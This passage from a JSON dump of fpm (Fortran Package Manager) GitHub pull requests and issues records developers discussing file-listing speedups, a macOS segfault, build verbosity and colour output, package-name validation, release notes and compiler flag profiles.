                    "user": "awvwgk",
                    "date": "2021-09-05 16:51:14+00:00",
                    "text": "Fixed by #521"
                }
            ]
        },
        {
            "number": 507,
            "user": "brocolis",
            "date": "2021-06-30 02:19:05+00:00",
            "title": "optimize file listing",
            "text": "This PR is an attempt to optimize the file listing subroutine as reported at Discourse [1].\nThis implementation is pure Fortran using the iso_c_binding module, but it depends on the preprocessor to compile. The trouble is that the C types struct dirent and struct stat have different sizes/contents in different platforms. [2-5]\nThis PR was tested on Windows with MinGW 32 bit and MinGW 64 bit. On linux, it was tested with Debian 32 bit and Debian 64 bit. In all other platforms, this PR has no effect.\nTo enable this feature, build fpm with\nfpm build --flag \"-DMINGW64\"\nfpm build --flag \"-DMINGW32\"\nfpm build --flag \"-DLINUX64\"\nfpm build --flag \"-DLINUX32\"\nCC @zoziha, @LKedward\n[1] https://fortran-lang.discourse.group/t/fpm-may-be-io-blocking-problem-feedback-in-fpm-test\n[2] https://github.com/mirror/mingw-w64/blob/master/mingw-w64-headers/crt/dirent.h\n[3] https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/dirent.h.html\n[4] https://github.com/mirror/mingw-w64/blob/master/mingw-w64-headers/crt/sys/stat.h\n[5] https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/sys_stat.h.html",
            "comments": [
                {
                    "user": "zoziha",
                    "date": "2021-06-30 07:51:28+00:00",
                    "text": "Give an example to test it.\nComputer configuration: ThinkPad S2 3rd (win-10, i5-8250U)\nDescription: time <command>\nComand: fpm test help-list\nExample1: ./help-list\nCommand being timed: \"./help-test\"\n\nreal    0m2.075s\nuser    0m0.000s\nsys     0m0.047s\nExample2: fpm(brocolis branch fpm build --profile release --flag \"-DMINGW64\") test help-list\nCommand being timed: \"fpm test help-list\"\n\nreal    0m2.851s\nuser    0m0.015s\nsys     0m0.000s\nExample3: fpm(0.3.0 release fpm build --profile release) test help-list\nCommand being timed: \"fpm test help-list\"\n\nreal    0m7.762s\nuser    0m0.015s\nsys     0m0.031s\n\nI have not tested the more specific situation. But this example mainly shows that the time it takes to run the executable program help-test.exe that has been generated using the fpm test command has not changed.\nI don\u2019t know enough about the code implementation of fpm, but I feel that this PR does not improve the time of the most time-consuming query file information part of fpm test on windows-gfortran?\n\nI'm sorry, I used gdb to perform partial testing of the fpm code, and found that I incorrectly had used --flag \"-DMINGW64\" to compile the master branch of brocolis's forked branch, so the result is consistent with the fpm 0.3.0 release version, I'm very sorry ,This is my mistake!\nAnd I corrected the above results, it is very thankful, thank you @brocolis  @LKedward  very much, the running time of fpm test is much less."
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-30 08:13:35+00:00",
                    "text": "Thanks Carlos @brocolis - I'll try this out later and look over the code. Thanks for testing it @zoziha - I'm surprised there's no improvement, there is perhaps another significant bottleneck somewhere."
                },
                {
                    "user": "zoziha",
                    "date": "2021-06-30 12:18:07+00:00",
                    "text": "I'm very sorry ,I made a mistake!\ud83d\ude25\nI corrected the above results, it is very thankful, thank you @brocolis @LKedward very much\u2764, the running time of fpm test is much less.\ud83d\udc4d"
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-30 13:52:33+00:00",
                    "text": "No worries @zoziha and thanks for checking it again - glad to see that it's an improvement (great work @brocolis!).\n\nThe trouble is that the C types struct dirent and struct stat have different sizes/contents in different platforms.\n\nYes this is true. We could solve it by wrapping the relevant code in a c function but this would prevent us from creating single-file bootstrap versions which are really useful. This may not be a big problem since we only officially support building fpm with gfortran (#205), so I don't mind the implementation here if we can be sure it won't cause problems on the most common platforms, but I'm not sure how to guarantee that. It's nice that the feature can be enabled/disabled for the time being."
                },
                {
                    "user": "brocolis",
                    "date": "2021-07-01 03:37:25+00:00",
                    "text": "Hi @zoziha, @LKedward, thanks for the feedback!.\nYes, the types in this PR are basically the result of the C preprocessor running on my machine, translated to Fortran syntax; I don't know if the code works on other linux distros. A C wrapper would be more maintainable and reliable, I agree.  Should we go in that direction? It's unfortunate that we'd lose the single-fortran-file bootstrap version."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-07-01 08:20:38+00:00",
                    "text": "Should we go in that direction? It's unfortunate that we'd lose the single-fortran-file bootstrap version.\n\nAs long as we have a single-file Fortran version that can be used in a two step bootstrapping process we would be fine. But I agree that retaining the single-file option for an one step bootstrapping process has some value."
                },
                {
                    "user": "brocolis",
                    "date": "2021-07-02 04:37:00+00:00",
                    "text": "As long as we have a single-file Fortran version that can be used in a two step bootstrapping process we would be fine. But I agree that retaining the single-file option for an one step bootstrapping process has some value.\n\nThanks @awvwgk, I'll try a version with a tiny C wrapper."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-02 09:34:48+00:00",
                    "text": "I'll try a version with a tiny C wrapper.\n\nThanks @brocolis - I think this is the right way to go since there are other file system functions that will need rewriting in a similar manner. Perhaps you can use preprocessor directives to enable the existing non c implementation just for when we produce the single-file version as Sebastian mentioned."
                },
                {
                    "user": "brocolis",
                    "date": "2021-07-07 03:49:09+00:00",
                    "text": "Added C wrapper. To enable this feature, build fpm with --flag \"-DENABLE_C_WRAPPER\"."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-10 09:21:19+00:00",
                    "text": "Great stuff @brocolis! However I think we should use the C wrapper by default and only require a compiler flag to enable the alternate Fortran code for when we want to put together a single-file version without the C code. What do you think?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-07-10 09:24:15+00:00",
                    "text": "How about using -DFPM_BOOTSTRAP to enable components not used for the regular production version?"
                },
                {
                    "user": "brocolis",
                    "date": "2021-07-11 02:13:45+00:00",
                    "text": "CI Build (macos-latest) failed with\nCMD= new --help EXITSTAT=0 CMDSTAT=0 MESSAGE= Program received signal SIGSEGV: Segmentation fault - invalid memory reference.\nI don't have access to macOS machine, can't run it under debugger.. need help here."
                },
                {
                    "user": "brocolis",
                    "date": "2021-07-11 14:24:28+00:00",
                    "text": "I think we can find a more meaningful file name than c.c for the file system functionality.\n\nI agree. Do you have any suggestion?"
                },
                {
                    "user": "brocolis",
                    "date": "2021-07-11 14:35:37+00:00",
                    "text": "CI Build (macos-latest) failed \u2026\n\nI tried renaming the is_dir function, just to be sure the test was running the correct code, but it had no effect in macOS CI. I can't fix this issue."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-11 14:54:24+00:00",
                    "text": "@everythingfunctional do you have a Mac machine and can possibly help out here?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-07-12 15:17:11+00:00",
                    "text": "@LKedward , I may have some time later today or tomorrow to give it a try. Are there any special instructions for how I should start? Or just build this branch and run the test suite?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-12 15:21:27+00:00",
                    "text": "Thanks! The error appears to be in new-test which tests the fpm new command. Any help would be appreciated, even if you're able to tell us on which line(s) it occurs or give a full back-trace, that could be enough to point us in the right direction."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-07-12 20:35:23+00:00",
                    "text": "Ok, running the command fpm test --target new-test --runner gdb on my Mac, I get the following:\n...\nCMD= new --help EXITSTAT=0 CMDSTAT=0 MESSAGE=\n\nThread 2 received signal SIGSEGV, Segmentation fault.\n0x00007fff20520588 in ?? ()\n(gdb) bt\n#0  0x00007fff20520588 in ?? ()\n#1  0x00007ffeef4ccb30 in ?? ()\n#2  0x0000000100020562 in f_string_cptr (__result=<error reading variable>, .__result=0xa004f7000, cptr=<error reading variable: Attempt to dereference a generic pointer.>) at ././src/fpm_strings.f90:146\nBacktrace stopped: frame did not save the PC\n\nIn my experience gdb on Mac is very flaky, hence why it doesn't seem to have been able to provide a full backtrace and I wasn't really able to inspect the state of things much. This gives you a place to start looking, but not a lot to go on. If there are other things you'd like me to try I can, just let me know."
                },
                {
                    "user": "brocolis",
                    "date": "2021-07-13 04:03:25+00:00",
                    "text": "Thanks @everythingfunctional ! I will look into the issue."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-07-13 08:29:29+00:00",
                    "text": "I have no experience with MacOS but perhaps the Intel Inspector tool from\nIntel oneAPI can help? I have found it to be quite useful on Windows for\nmemory-related issues.\n\nOp di 13 jul. 2021 om 06:03 schreef Carlos Une ***@***.***>:\n\u2026\n Thanks @everythingfunctional <https://github.com/everythingfunctional> !\n I will look into the issue.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#507 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YRZYQWCBB5MTCJB22LTTXO3JRANCNFSM47RL4OBA>\n ."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-16 14:29:22+00:00",
                    "text": "Hi Carlos @brocolis - I've implemented a small fix for OSX based on this conversation: rust-lang/libc#414.\nIt seems to be working, let me know what you think."
                },
                {
                    "user": "brocolis",
                    "date": "2021-07-17 00:09:47+00:00",
                    "text": "Hi Carlos @brocolis - I've implemented a small fix for OSX based on this conversation: rust-lang/libc#414.\nIt seems to be working, let me know what you think.\n\n@LKedward looks good. Thank you for the fix!."
                },
                {
                    "user": "brocolis",
                    "date": "2021-07-17 00:11:33+00:00",
                    "text": "I would call it filesystem_utilities.c, but the rest looks ok. I like that we are able to switch back to a pure Fortran implementation for producing a single file \"bootstrap\" version.\n\n@everythingfunctional thank you for the suggestion!. I'll rename it."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-28 09:14:31+00:00",
                    "text": "Carlos @brocolis, are you able to resolve the merge conflicts in this, or do you need help?"
                },
                {
                    "user": "brocolis",
                    "date": "2021-07-28 10:09:21+00:00",
                    "text": "@LKedward I'm not able to resolve the merge conflicts, I need help. 'Resolve conflicts' button appears disabled for me."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-28 10:41:13+00:00",
                    "text": "No problem @brocolis - I can take a look at it.\n(When the button is disabled, it just means you need to do the merge in your local copy instead of via the web editor.)"
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-28 14:59:17+00:00",
                    "text": "Many thanks Carlos @brocolis and thanks everyone for reviewing! With three approvals, I'll now merge."
                }
            ]
        },
        {
            "number": 506,
            "user": "certik",
            "date": "2021-06-29 17:04:31+00:00",
            "title": "Draft: initial implementation of implicit_none",
            "text": "@epagone and I worked on this and implemented the following.\nThis adds implicit_none flag to fpm.toml, if it is not specified, it will be .false. by default.\nThen it is propagated to the model, at the top level (for now). Then in the backend we read this flag from the model and insert -fimplicit-none into the command line flag (so it only works for gfortran for now).\nTODO:\n\n It should be integrated with the rest of the compiler options / profiles (currently we add it in fpm_backend.f90 which is probably too late, it should be already part of target%compile_flags)\n Generate the correct flag for each compiler\n Add a test for this\n This should be set on per package basis and even allow to override per file basis\n Design question: should this flag by part of the model as is done in this PR (perhaps on per package/per file basis) or should it be collected directly from fpm.toml and put into compiler flags / profiles and never expose it explicitly in the model?\n Turn this on by default",
            "comments": [
                {
                    "user": "certik",
                    "date": "2021-06-29 18:08:21+00:00",
                    "text": "Yes, implicit-typing=false should be the default then in the long run.\nYes, we couldn't quickly figure out how to do it on the per-package basis instead of global. We have to look into the build subtable."
                },
                {
                    "user": "certik",
                    "date": "2021-07-13 18:26:00+00:00",
                    "text": "@epagone will you have time to finish this PR?"
                },
                {
                    "user": "epagone",
                    "date": "2021-07-13 19:08:56+00:00",
                    "text": "Yes, I do not intend to let it go stale, sorry for the waiting. This week is extremely busy, I plan on having a look at it next week."
                },
                {
                    "user": "certik",
                    "date": "2021-07-13 21:22:48+00:00",
                    "text": "Awesome, thanks! If you get stuck, please let me know, I can help."
                },
                {
                    "user": "certik",
                    "date": "2021-08-10 04:48:01+00:00",
                    "text": "@epagone just a friendly ping. :)"
                },
                {
                    "user": "MarDiehl",
                    "date": "2021-08-10 09:44:58+00:00",
                    "text": "The corresponding option for ifort is -warn declaration"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-08-12 13:45:35+00:00",
                    "text": "I would suggest implementing this on top of the profiles feature. The logic is already worked out for propagating profiles, this would introduce logic about how different parts of the profiles are propagated."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-12 16:11:10+00:00",
                    "text": "I agree with Brad that we should build this on the compiler profiles branch instead."
                },
                {
                    "user": "certik",
                    "date": "2021-08-13 03:29:52+00:00",
                    "text": "Can somebody more familiar with fpm internals create a prototype how to hook this up with an option in fpm toml? I can then try to polish it."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-13 06:08:57+00:00",
                    "text": "Sure, but we need to handle some prerequisites first. We need some abstraction for the compiler to actually retrieve the flag (#451 is a start) and we need a more refined model to adjust flags on per project basis (#498)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-23 20:32:48+00:00",
                    "text": "I can take a look into implementing this feature once we merged #575, which implements the necessary infrastructure to make this possible. But since this is also a straight-forward addition and some of you already started working on it, I'll also offer to only give a few pointers on how this is could be implemented and than hold myself back. Let me know what you preference here is.\nIn any case, this PR is not a good place to discuss this feature. Therefore, I suggest we close this PR since it has significantly diverged from the main branch and continue the discussion at #577."
                },
                {
                    "user": "epagone",
                    "date": "2021-09-23 21:02:03+00:00",
                    "text": "Yes, I would like to take a shot at this, please. I had exactly the same plan in mind: wait for the work on the flags to stabilise a minimum and then ask for some pointers. I can't promise that I will be fast but, if you agree, I want to give it a try."
                },
                {
                    "user": "certik",
                    "date": "2021-09-23 22:49:34+00:00",
                    "text": "Sure, that's fine. As long as it gets done. :)"
                },
                {
                    "user": "epagone",
                    "date": "2021-09-24 11:00:51+00:00",
                    "text": "As long as it gets done. :)\n\nIf that is your order, yessir! :)"
                }
            ]
        },
        {
            "number": 505,
            "user": "urbanjost",
            "date": "2021-06-28 05:07:41+00:00",
            "title": "quiet mode for #502",
            "text": "Tries to address some of the issues in #502, parts of which have come up previously before.\nadd a conditional routine fpm_stop that calls ERROR STOP if in\nverbose mode but STOP otherwise.\nadd some color to the output. Set environment variable FPM_COLOR\nto \"plain\" to turn it off. Note that the gfortran extension ISATTY()\nis used to signal to turn off color when redirecting output.\nMake build output quieter in normal mode and only echo commands being\nexecuted when in verbose mode.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-06-29 08:11:15+00:00",
                    "text": "Thanks @urbanjost for putting this together so quickly - I'll try to review it in the coming days."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-01 02:01:25+00:00",
                    "text": "OK. Made changes per the suggestions. Note that at this time each build uses all the same compiler switches to displaying it once works with --verbose; but in the future compilation options may apply on a per-file-basis. If that becomes the case it would probably be better to display each compile command that is not default."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-02 11:08:14+00:00",
                    "text": "Thanks @urbanjost - I think you still need to add an argument to fpm_backend::build_package and fpm_backend::build_target for settings%verbose in order to enable/disable verbosity in the backend.\n\nHere are my thoughts/wishes about redirecting compiler output:\n\nI'd like to see all output redirected to log files and only re-printed to screen if --verbose is specified (otherwise, this PR doesn't really reduce verbosity very much)\nIf in quiet mode, then a small message/symbol can be used to indicate that the compiler produced non-fatal messages for a particular target\nfpm build --verbose will print logged messages even when targets are up-to-date - this gives the user a quick way to view any warning messages after running in quiet mode\n\n(These can be addressed in a future PR)"
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-02 11:27:50+00:00",
                    "text": "Here are my thoughts/wishes about redirecting compiler output:\n\nFor some additional context for what I have in mind, here is the output of my very rough attempt at a build progress indicator which I'm planning for a separate PR once cleaned up:\n\n  \n    \n    \n\n    fpm_progress_demo-2021-07-02_12.21.57.mp4"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-09 02:47:30+00:00",
                    "text": "In my own build system all builds go to a log file. One question (which can limit the compiler) is whether each file should have it's own log file. To be able to build a complete log but support incremental builds it seems each file would be required to be built individually, and it would be good to have them flagged as to whether they contain warnings or errors (there has been discussion of a \"keep going\" option on builds similar to a -k on make(1) that I support) and each compiler varies as to whether they produce a different return on hitting an error or warning versus no messages, so it could get complicated;but have played with a similar plugin (with a number of dependencies as it uses ncurses(3c), for example) that lets you click on the filenames somewhat like \"midnight commander\"; where you can choose a function like \"edit\", \"view log\", and both (using vim(1) split screen) but it was getting to many dependencies for now. Except for gfortran and debug mode in fpm the output is not very verbose just removing the compiler command but I like the results. Some MSWindows environments still exist that do not support ANSI escape sequences, which is another complication. All that being said, I like the idea though, and was planning on a similar direction. This was more a first cut at adding more of a customized interface than just living with the default output generated by calling the commands to see what response there was and to see what problems were encountered in various programming environments. Looks like you had already gotten farther so I have no problem withdrawing this one as it would likely conflict with what you demonstrated.  Making a general verbose option seems like it will be needed so maybe just creating that as a first step would be a better approach. Wanted to also look at preprocessing. In my own environment different post-processors are called for different suffixes and the resulting output files become what is distributed so someone picking up the package needs no post processor and the resulting files are hidden like fpm hides the object files so you can make builds with different options; but that does not generically solve the problem if you want to distribute files that might need local preprocessing when distributing source like fpm does. The post-processed files and *.o files actually all go into  ar(1) files so you have the expanded code and the object files in single files and no *.o files.  Worked great with regular libraries but lately *.mod files (which only one environment that I know of lets you put those into a library file instead of individual files) have complicated my old scheme a little bit.  So until it causes a problem, I think individual logs for each file is indeed the way to go."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-10 09:11:23+00:00",
                    "text": "Thanks @urbanjost,\n\nLooks like you had already gotten farther so I have no problem withdrawing this one as it would likely conflict with what you demonstrated\n\nI'm happy to continue with this PR and to add my changes (which are only cosmetic) at a later stage once I've cleaned up the implementation.\nAre you able to address my previous comment about enabling/disabling verbosity in the backend? It looks like after one of your recent changes the --verbose flag no longer echoing outputs."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-12 12:51:41+00:00",
                    "text": "Interesting.  Even the GNU ld(1) command describes itself as a \"linker\" now; albeit the documentation intermixes \"link\" and \"load\".\nAn interesting shift. In my local community it is still called the \"loader\", but looking on the WWW \"link\" is prevalent; and \"lgo\" is virtually non-existent. And \"link\" is defined in FOLDOC far closer than \"load\" is. \"link\" it is. I assure you \"ld\" once stood for \"loader\", but I found several references to it meaning \"link dependencies\"."
                }
            ]
        },
        {
            "number": 504,
            "user": "brocolis",
            "date": "2021-06-26 05:22:44+00:00",
            "title": "install.sh, README.md: Update version number, single source file extension",
            "text": "Thank you for the new release.\nThis PR updates the version number and the single source file extension in install.sh and README.md.",
            "comments": []
        },
        {
            "number": 503,
            "user": "han190",
            "date": "2021-06-23 22:38:25+00:00",
            "title": "Space in the name section",
            "text": "Hi, thanks for this great tool. I tried fpm on my toy project yesterday and it all went well! But it took me a while to figure out that spaces are not allowed in the name section. I've never used .toml before so bear with me! The issue is, for example,\nname = \"Hello-World\"\nis fine but\nname = \"Hello World\"\nwill create one folder named Hello in the build directory and another folder named World in the repository root directory. So would you please add a sentence to mention that space is not allowed in the name section in PACKAGING.md?\nThanks again for this great tool!",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-06-24 06:49:54+00:00",
                    "text": "Thanks for the report. I think this is a bug in the way directories are created, a space in the package name should be allowed."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-06-25 16:29:24+00:00",
                    "text": "There was a conscious decision to limit the name to what is allowed for a Fortran variable name early on; which has since been extended to allow an ANSI dash character as well.  If you entered \"fpm new 'one two'\" it would cause an error; but there is no revalidation check of the fpm.toml file.  Spaces and many other characters in names are very problematic in command line environments and the name used in the fpm.toml file may be or is involved in the generation of file names. In this case when the\ncommand  \"mkdir build/NNNN_a b c\"  is run to make the scratch directory with requoting it goes through the execute command which calls a shell and does shell expansion, ending with three directories being generated. There are a lot of issues like that, not just with the  name in the fpm.toml file if special characters are in names.  The \"new\" subcommand already checks the name and the original request was just to  this.  I think an additional simple check when reading the fpm.toml file and adding some more documentation would be better."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 18:49:17+00:00",
                    "text": "This should be fixed with #511 now."
                }
            ]
        },
        {
            "number": 502,
            "user": "milancurcic",
            "date": "2021-06-23 16:52:13+00:00",
            "title": "Show verbose output with -v and --verbose",
            "text": "I think initially proposed here.\nCurrently fpm prints compiler commands that it executes to the standard output, which is quite verbose. I don't think there's a way to disable it.\nSuch output should be enabled with -v or --verbose flags, and by default only print a concise and pretty status like a progress bar. A progress bar is for a separate issue, but in the meantime fpm could just print something like:\nCompiling src/some_module.f90...\nCompiling src/another_module.f90...\n...\n\nor similar.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-06-28 23:38:09+00:00",
                    "text": "Before reformatting to much, take a look at #PR504 or there is a single-file version (temporarily) at\nbootstrap. Feedback on if that looks better appreciated."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-06-29 23:17:26+00:00",
                    "text": "@milancurcic, @certik  -- is that in the direction of what you had in mind?  Does anyone know if there are any Programming Environments that use terminal emulators that do not obey ANSI in-line escape sequences? I made color the default when output it to a TTY."
                },
                {
                    "user": "certik",
                    "date": "2021-06-29 23:33:27+00:00",
                    "text": "I tested it and it looks like this for me:\n\nSo you can see the different colors and it hides the compilation line. Yes, that is exactly what I had in mind. I tested it on the fpm sources themselves, which produce a lot of warnings for me (we should fix those --- separate issue).\nThank you!"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-06-30 03:17:46+00:00",
                    "text": "I made the default help for a plain \"fpm\" or \"fpm --list\" command more colorful for a nice first impression; and trivially colorized the general help text. A context colorizer routine would be nice.  If you do \"fpm build --profile release\" it is a lot less verbose to see how it \"should\" look. There are a lot of bugzilla entries about the excessive amount of messages; and some are pretty old, so it might be a while before that goes away. So many messages it is easy to miss the important ones, but like you said \"separate issue\".  It gets messy pretty quickly without a context colorizer so do not plan on coloring anything else that much but it came out OK."
                },
                {
                    "user": "brocolis",
                    "date": "2021-07-03 04:57:29+00:00",
                    "text": "Idea: if a command fails, fpm could display the last command line that failed, so that users would not need to run fpm again, with --verbose."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-11 23:33:01+00:00",
                    "text": "Per a discussion with @LKedward I think the idea is that the compile, load, and archive commands will write to a log file.  Then the log file for the last command can be displayed on failure, and some way to redisplay all the messages, hopefully some way to display the logs for specified source files, and that opens up the possibility that plugin tools could post-process the logs, and maybe allow invoking an edtor and jumping to a line, etc.  I  think that would incorporate your suggestion; maybe needs a more formal spec but I think all the ideas will come together nicely. Of course, if gfortran did not spit out so messages this  would not be so highly desirable"
                }
            ]
        },
        {
            "number": 501,
            "user": "LKedward",
            "date": "2021-06-23 10:11:57+00:00",
            "title": "Bump version for new release",
            "text": "Based on #399, I've bumped the version to 0.3.0. See below for draft release notes.\n\nChanges:\n\n\nAdd check for duplicate module names (not allowed) (#412)\n\n\nAdd support for detecting FreeBSD (#468)\n\n\nExit more gracefully with useful error messages for build,run,test (#491)\n\n\nNew features:\n\n\nAdd external-modules manifest field to allow using installed library modules (#438)\n\n\nAdd -C/--directory flag to change working directory (#483)\n\n\nAdd automatic discovery of manifest files in parent directories (#483)\n\n\nAdd simple support for invoking plugins from fpm (#484)\n\n\nAdd support for specifying command line inputs via response files\n\n\nAdd support for reading package version from file (#500)\n\n\nFixes:\n\n\nFix default flags for Intel fortran on Windows (#431)\n\n\nRemove -coarray=single flag from default Intel flags (#437)\n\n\nAllow using the lib archiver in Windows (#442)\n\n\nInvoke matching c compiler when compiling c code (#433)\n\n\nFix spurious output when checking for archiver (#489)\n\n\nFix to module statement parsing (#490)\n\n\nFix for specifying compiler flags containing an equals(=) sign (#497)",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-06-23 11:02:44+00:00",
                    "text": "Cheers \ud83d\udc4d"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-23 11:36:55+00:00",
                    "text": "I added the single file version and updated the conda-forge release (rollout in the CDN will be done in two hours). Will check my homebrew tap and the MSYS2 packaging later this week."
                }
            ]
        },
        {
            "number": 500,
            "user": "awvwgk",
            "date": "2021-06-20 10:19:23+00:00",
            "title": "Allow reading version number from file",
            "text": "Some projects don't store the version number in the build files but in a separate file. This allows to have central place for all tools to retrieve the version number from rather than multiple redundant version number entries.\n\nmeson supports using file objects as version since 0.57.0 (see https://mesonbuild.com/Reference-manual.html#project).\n.VERSION file is used in json-fortran and is parsed in CMake here.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-06-23 10:02:09+00:00",
                    "text": "With two approvals I'll now merge. Thanks @awvwgk"
                }
            ]
        },
        {
            "number": 498,
            "user": "kubajj",
            "date": "2021-06-18 15:08:42+00:00",
            "title": "Compiler flags profiles",
            "text": "This pull request contains all my contribution implemented during my GSoC 2021 Handling compiler arguments project.\nI have implemented the following features:\n\nparsing of profiles table in toml syntax\nprofiles representation in package\nscope of flags (project-wide profiles, package-wide profiles, files scope flags)\norganise compiled code into multiple build directories based on the flags of each source file\nhandle compiler profiles hierarchy (user-specified > parent user-specified > built-in profiles)\n\nChanges:\n\nMove the default compiler flags to profiles.f90 to the function get_default_profiles, which returns an array of profile_config_ts\nChange 'gfortran' in fpm.90/build_model to DEFAULT_COMPILER introduced in profiles.f90, for consistency\nAdd proj_dir argument to get_package_data and new_package for file scope profiles\nExtend package_t and package_config_t definitions with profile_config_t\nCreate all include_dirs at the beginning of build_package subroutine\nRemove build_name from fpm_command_line and simplify check_build_vals subroutine\nModify fpm_compiler/get_module_flags not to include any directories, but just handle module flags\nAdd a conditional checking for allocation of fields in fpm_model - Should fix issues with show_model\nReplace model%output_directory with function get_output_directory\n\nNew features:\n\nprofile_config_t and profiles toml table parser in src/fpm/manifest/profiles.f90\nfind_profile subroutine which finds a profile with given parameters in an array of profile_config_t\ninfo_profile function which returns representation of a profile as a string\nAdd flags to targets in fpm_targets/build_target_list\nTests for profiles in test_manifest.f90\nExample packages tested by ci/run_tests.sh\n\nMy blog on Fortran-lang discourse\nlink to Fortran-lang discourse",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-08-10 07:14:48+00:00",
                    "text": "Sebastian @awvwgk - would you mind reviewing the changes in src/fpm/dependency.f90?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-10 09:16:40+00:00",
                    "text": "I prefer to have the changes for the dependency tree in a different PR, this makes them easier to review and we will also get them merged much faster."
                },
                {
                    "user": "kubajj",
                    "date": "2021-08-10 11:14:15+00:00",
                    "text": "I prefer to have the changes for the dependency tree in a different PR, this makes them easier to review and we will also get them merged much faster.\n\nI opened a new PR #539. Hope this helps."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-11 09:29:40+00:00",
                    "text": "I checked the manifest validation a bit and found a few interesting edge cases:\nToo deep nested tables are not flagged as invalid as long as they contain valid keywords.\nname = \"example\"\n[profiles.gfortran.gfortran.gfortran.gfortran]\n[profiles.gfortran.ifort.flang.lfortran]\n[profiles.linux.windows.macos.freebsd]\nSchema check on profile level does not catch invalid keywords:\nname = \"example\"\n[profiles.ifort]\nnot-supported = true"
                },
                {
                    "user": "kubajj",
                    "date": "2021-08-11 10:09:55+00:00",
                    "text": "I checked the manifest validation a bit and found a few interesting edge cases:\nToo deep nested tables are not flagged as invalid as long as they contain valid keywords.\nname = \"example\"\n[profiles.gfortran.gfortran.gfortran.gfortran]\n[profiles.gfortran.ifort.flang.lfortran]\n[profiles.linux.windows.macos.freebsd]\nSchema check on profile level does not catch invalid keywords:\nname = \"example\"\n[profiles.ifort]\nnot-supported = true\n\nThis is one of the reasons why I decided to keep the loop in get_flags, however, when we discussed it with Brad and Laurence, we decided to focus on functionality rather than covering edge cases. Right now, it does not fail, it just ignores them."
                },
                {
                    "user": "LKedward",
                    "date": "2021-08-11 10:39:24+00:00",
                    "text": "... we decided to focus on functionality rather than covering edge cases. Right now, it does not fail, it just ignores them.\n\nIf you've got the time this week to look into addressing these cases, that would be great. It may need to be done before merging anyway. What is the main difficulty in identifying these cases?"
                },
                {
                    "user": "kubajj",
                    "date": "2021-08-11 11:35:42+00:00",
                    "text": "... we decided to focus on functionality rather than covering edge cases. Right now, it does not fail, it just ignores them.\n\nIf you've got the time this week to look into addressing these cases, that would be great. It may need to be done before merging anyway. What is the main difficulty in identifying these cases?\n\nIf I remember correctly, there were some issues with the difference between string_t and character arrays, but I'll look into it."
                },
                {
                    "user": "kubajj",
                    "date": "2021-08-12 09:01:27+00:00",
                    "text": "... we decided to focus on functionality rather than covering edge cases. Right now, it does not fail, it just ignores them.\n\nIf you've got the time this week to look into addressing these cases, that would be great. It may need to be done before merging anyway. What is the main difficulty in identifying these cases?\n\nIf I remember correctly, there were some issues with the difference between string_t and character arrays, but I'll look into it.\n\nI take this back, it was not difficult at all."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-25 19:46:21+00:00",
                    "text": "I'll look into the conflicts soon-ish and than we can sort out how we will proceed to get this important patch merged smoothly."
                },
                {
                    "user": "kubajj",
                    "date": "2021-08-25 20:28:39+00:00",
                    "text": "I'll look into the conflicts soon-ish and than we can sort out how we will proceed to get this important patch merged smoothly.\n\nI can look into it tomorrow, but I need to set up fpm on my laptop first."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-09-15 14:21:19+00:00",
                    "text": "@kubajj or @awvwgk , have either of you had time to look at and/or resolve the merge conflicts? I'm getting more and more anxious to start using (and see how others use) this feature. Is there something tricky about resolving them? I could potentially find some time in the next week or two to help out if needed."
                },
                {
                    "user": "kubajj",
                    "date": "2021-09-17 20:08:42+00:00",
                    "text": "@kubajj or @awvwgk , have either of you had time to look at and/or resolve the merge conflicts? I'm getting more and more anxious to start using (and see how others use) this feature. Is there something tricky about resolving them? I could potentially find some time in the next week or two to help out if needed.\n\nI am sorry for replying so late. I am currently traveling to UK to start the semester on Monday and I had limited connection. I looked into the merge conflicts, but did not manage to fix them. There are parts of the  build_model subroutine which were redesigned, so I approached Sebastian who suggested me to implement issue #422 first."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-17 20:25:12+00:00",
